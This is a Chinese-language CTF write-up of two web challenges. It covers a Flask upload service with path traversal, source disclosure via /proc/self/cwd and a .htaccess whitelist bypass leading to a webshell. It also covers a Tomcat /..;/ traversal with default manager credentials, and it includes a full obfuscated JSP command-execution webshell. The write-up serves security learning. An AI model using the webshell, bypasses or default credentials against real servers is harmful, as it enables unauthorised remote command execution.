# 文件上传

文件上传,上传后显示的路径是view，F12发现文件的储存位置，

![Untitled](%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%20329cca66851b4a0e8c72df7d9eecf4f2/Untitled.png)

上传别的文件时显示只可以上传图片

目录穿越，两次url绕过

![Untitled](%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%20329cca66851b4a0e8c72df7d9eecf4f2/Untitled%201.png)

获取源码，这里有个小知识点/proc/self/cwd会指向现在的工作目录

/proc/self/cwd/app.py拿到源码

```python
from flask import Flask, render_template, request, flash, redirect, send_file
from urllib.parse import urlparse
import re
import os
from hashlib import md5
import asyncio
import requests

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = os.path.join(os.curdir, "uploads")
# app.config['UPLOAD_FOLDER'] = "/uploads"
app.config['MAX_CONTENT_LENGTH'] = 1*1024*1024
app.secret_key = b'_5#y2L"F4Q8z\n\xec]/'
ALLOWED_EXTENSIONS = {'png', 'jpg', 's'}

if not os.path.exists(app.config['UPLOAD_FOLDER']):
    os.mkdir(app.config['UPLOAD_FOLDER'])

def secure_filename(filename):
    return re.sub(r"(\.\.|/)", "", filename)

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route("/")
def index():
    return render_template("home.html")

@app.route("/upload", methods=["POST"])
def upload():
    caption = request.form["caption"]
    file = request.files["image"]

    if file.filename == '':
        flash('No selected file')
        return redirect("/")
    elif not allowed_file(file.filename):
        flash('Please upload images only.')
        return redirect("/")
    else:
        if not request.headers.get("X-Real-IP"):
           ip = request.remote_addr
        else:
           ip = request.headers.get("X-Real-IP")
        dirname = md5(ip.encode()).hexdigest()
        filename = secure_filename(file.filename)
        upload_directory = os.path.join(app.config['UPLOAD_FOLDER'], dirname)
        if not os.path.exists(upload_directory):
            os.mkdir(upload_directory)
        upload_path = os.path.join(app.config['UPLOAD_FOLDER'], dirname, filename)
        file.save(upload_path)
        return render_template("uploaded.html", path = os.path.join(dirname, filename))

@app.route("/view/<path:path>")
def view(path):
    return render_template("view.html", path = path)

@app.route("/uploads/<path:path>")
def uploads(path):
    # TODO(noob):
    # zevtnax told me use apache for static files. I've
    # already configured it to serve /uploads_apache but it
    # still needs testing. I'm a security noob anyways.
    return send_file(os.path.join(app.config['UPLOAD_FOLDER'], path))

if __name__ == "__main__":
    app.run(port=5000)
```

文件后缀名白名单里的s将.htaccess改名为.htacces..s

上传图片马，然后将uplouds改成uploads_apache来getshell

![Untitled](%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%20329cca66851b4a0e8c72df7d9eecf4f2/Untitled%202.png)

发现本地没有flag，只有往内网去想，拿到ip

![Untitled](%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%20329cca66851b4a0e8c72df7d9eecf4f2/Untitled%203.png)

### ****[WUSTCTF2020]Train Yourself To Be Godly****

### Tomcat目录穿越

当服务端采用Nginx做反向代理，Tomcat做为真正的后端时/..;/目录穿越

![Untitled](%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%20329cca66851b4a0e8c72df7d9eecf4f2/Untitled%204.png)

到/manager/html访问后台密码tomcat:tomcat

![Untitled](%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%20329cca66851b4a0e8c72df7d9eecf4f2/Untitled%205.png)

shell

![Untitled](%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%20329cca66851b4a0e8c72df7d9eecf4f2/Untitled%206.png)

```jsx
//来源https://github.com/LandGrey/webshell-detect-bypass/tree/master/webshell/jsp
//cmd.jsp
<%@ page pageEncoding="utf-8"%>
<%@ page import="java.util.Scanner" %>
<HTML>
<title>Just For Fun</title>
<BODY>
<H3>Build By LandGrey</H3>
<FORM METHOD="POST" NAME="form" ACTION="#">
    <INPUT TYPE="text" NAME="q">
    <INPUT TYPE="submit" VALUE="Fly">
</FORM>

<%
    String op="Got Nothing";
    String query = request.getParameter("q");
    String fileSeparator = String.valueOf(java.io.File.separatorChar);
    Boolean isWin;
    if(fileSeparator.equals("\\")){
        isWin = true;
    }else{
        isWin = false;
    }

    if (query != null) {
        ProcessBuilder pb;
        if(isWin) {
            pb = new ProcessBuilder(new String(new byte[]{99, 109, 100}), new String(new byte[]{47, 67}), query);
        }else{
            pb = new ProcessBuilder(new String(new byte[]{47, 98, 105, 110, 47, 98, 97, 115, 104}), new String(new byte[]{45, 99}), query);
        }
        Process process = pb.start();
        Scanner sc = new Scanner(process.getInputStream()).useDelimiter("\\A");
        op = sc.hasNext() ? sc.next() : op;
        sc.close();
    }
%>

<PRE>
    <%= op %>>
</PRE>
</BODY>
</HTML>
```

浏览器404，burp抓包去掉路径里的example，加上Authonzation: Basic tomcat:tomcat的base64值

dG9tY2F0OnRvbWNhdA==

还需要一开始访问时的cookie

![Untitled](%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%20329cca66851b4a0e8c72df7d9eecf4f2/Untitled%207.png)